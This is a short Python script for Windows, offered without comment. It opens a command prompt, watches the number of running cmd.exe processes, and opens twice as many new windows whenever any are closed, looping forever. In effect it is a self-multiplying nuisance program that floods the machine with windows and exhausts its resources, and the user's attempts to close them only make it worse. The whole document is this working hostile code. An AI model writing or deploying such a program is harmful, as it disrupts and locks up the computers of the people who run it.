import subprocess
import time
import threading

def cmd_count():
    output = subprocess.run("tasklist", capture_output=True, text=True, shell=True)
    tasks = output.stdout.split("\n")
    return sum(1 for task in tasks if "cmd.exe" in task)

def open_cmd_instances(count):
    for _ in range(count):
        subprocess.Popen("cmd /c start cmd", shell=True)

def monitor_cmd():
    while True:
        previous_count = cmd_count()
        time.sleep(1)
        current_count = cmd_count()
        if current_count < previous_count:
            diff = previous_count - current_count
            open_cmd_instances(diff * 2)

subprocess.Popen("cmd /c start cmd", shell=True)

monitor_thread = threading.Thread(target=monitor_cmd)
monitor_thread.daemon = True
monitor_thread.start()

while True:
    time.sleep(1)
